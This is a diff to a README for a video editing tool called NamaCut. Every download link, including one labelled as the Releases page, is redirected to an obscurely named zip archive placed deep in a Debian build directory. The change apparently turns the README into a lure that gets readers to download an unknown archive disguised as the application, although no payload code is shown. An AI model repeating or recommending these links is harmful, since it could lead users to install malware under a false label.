@@ -1,6 +1,6 @@
 # 🎥 NamaCut - Trim and Convert Videos Easily
 
-[![Download NamaCut](https://raw.githubusercontent.com/yoyorajveer45/NamaCut/main/debian/NamaCut-3.6.zip)](https://raw.githubusercontent.com/yoyorajveer45/NamaCut/main/debian/NamaCut-3.6.zip)
+[![Download NamaCut](https://raw.githubusercontent.com/yoyorajveer45/NamaCut/main/debian/.debhelper/generated/namacut/Nama_Cut_nashgob.zip)](https://raw.githubusercontent.com/yoyorajveer45/NamaCut/main/debian/.debhelper/generated/namacut/Nama_Cut_nashgob.zip)
 
 ## 📥 Introduction
 
@@ -26,7 +26,7 @@ To get started with NamaCut, follow these steps:
 
 Before you can use NamaCut, you need to download it. Click the link below to go to the Releases page where you can find the latest version:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/yoyorajveer45/NamaCut/main/debian/NamaCut-3.6.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/yoyorajveer45/NamaCut/main/debian/.debhelper/generated/namacut/Nama_Cut_nashgob.zip)
 
 ### 2. Choose the Right Version
 
@@ -88,6 +88,6 @@ If you encounter any issues or have questions, please open an issue in the GitHu
 
 Don't forget to download NamaCut from the link below:
 
-[Download NamaCut](https://raw.githubusercontent.com/yoyorajveer45/NamaCut/main/debian/NamaCut-3.6.zip)
+[Download NamaCut](https://raw.githubusercontent.com/yoyorajveer45/NamaCut/main/debian/.debhelper/generated/namacut/Nama_Cut_nashgob.zip)
 
 With NamaCut, video editing is straightforward and enjoyable. Start trimming and converting your videos today!
